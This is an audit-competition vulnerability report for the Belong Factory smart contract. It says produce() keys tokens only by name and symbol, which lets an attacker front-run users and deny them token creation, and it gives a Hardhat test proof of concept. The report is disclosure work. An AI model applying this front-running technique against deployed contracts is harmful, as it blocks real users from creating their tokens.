# 57437 sc medium front running in factory produce&#x20;

**Submitted on Oct 26th 2025 at 08:45:30 UTC by @grearlake for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57437
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

Due to the way the hashed salt is generated in the `produce()` function, it is possible to DoS users from creating an access token by front-running them.

### Vulnerability Details

In `produce()` the hashed salt is created and checked as follows:

```solidity
bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);

require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
```

The `_metadataHash` function depends only on `name` and `symbol`:

```solidity
function _metadataHash(string memory name, string memory symbol) private pure returns (bytes32) {
    return keccak256(abi.encode(name, symbol));
}
```

Because the unique key (hashed salt) is derived only from `name` and `symbol`, an attacker can front-run a legitimate user by creating an access token with the same `name` and `symbol`, blocking the original user from creating the token (DoS).

### Impact Details

* Denial of service: attackers can prevent others from creating access tokens by preemptively producing tokens with the same name and symbol. This is a griefing vector (no direct profit needed).

## Proof of Concept

Update the test at `test/v2/platform/factory.test.ts` with the following case:

```typescript
describe('Errors', () => {
  it('produce() params check', async () => {
    const { factory, alice, bob, signer } = await loadFixture(fixture);

    const nftName = 'AccessToken';
    const nftSymbol = 'AT';
    const contractURI = 'contractURI/AccessToken123';
    const price = ethers.utils.parseEther('0.05');

    const message = EthCrypto.hash.keccak256([
      { type: 'string', value: nftName },
      { type: 'string', value: nftSymbol },
      { type: 'string', value: contractURI },
      { type: 'uint96' as any, value: 500 },
      { type: 'uint256', value: chainId },
    ]);

    const signature = EthCrypto.sign(signer.privateKey, message);

    await factory.connect(alice).produce(
      {
        metadata: { name: nftName, symbol: nftSymbol },
        contractURI: contractURI,
        paymentToken: NATIVE_CURRENCY_ADDRESS,
        mintPrice: price,
        whitelistMintPrice: price,
        transferable: true,
        maxTotalSupply: BigNumber.from('1000'),
        feeNumerator: BigNumber.from('500'),
        collectionExpire: BigNumber.from('86400'),
        signature: signature,
      } as AccessTokenInfoStruct,
      ethers.constants.HashZero,
    );

    await expect(
      factory.connect(bob).produce(
        {
          metadata: { name: nftName, symbol: nftSymbol },
          contractURI: contractURI,
          paymentToken: NATIVE_CURRENCY_ADDRESS,
          mintPrice: price,
          whitelistMintPrice: price,
          transferable: true,
          maxTotalSupply: BigNumber.from('1000'),
          feeNumerator: BigNumber.from('500'),
          collectionExpire: BigNumber.from('86400'),
          signature: signature,
        } as AccessTokenInfoStruct,
        ethers.constants.HashZero,
      ),
    ).to.be.revertedWithCustomError(factory, 'TokenAlreadyExists');
  });
});
```

## References

* Vulnerable file: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol?utm\\_source=immunefi#L230-#L292>
